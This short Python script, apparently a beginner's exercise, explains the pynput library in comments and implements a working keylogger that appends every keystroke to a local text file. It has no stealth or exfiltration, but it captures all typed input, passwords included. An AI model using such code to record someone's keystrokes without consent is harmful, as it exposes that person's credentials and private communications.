# import pynput
# pynput is a libary used to listening&controlling both mouse and keybord

# from pynput.mouse import Controller (used to control mouse)
# from pynput.mouse import Listener (used to listen mouse)
# from pynput.keyboard import  Controller (used to control keybord)
# from pynput.keyboard import  Listener (used to listen keybord)

from pynput.keyboard import Listener

def listing(key):
    try:
        with open("TextEnter.txt",'a') as E:
            E.write(key.char)
    except AttributeError:
        with open("TextEnter.txt", 'a') as E:
            E.write(f"[{key}]")


with Listener(on_press=listing) as L:
    L.join()
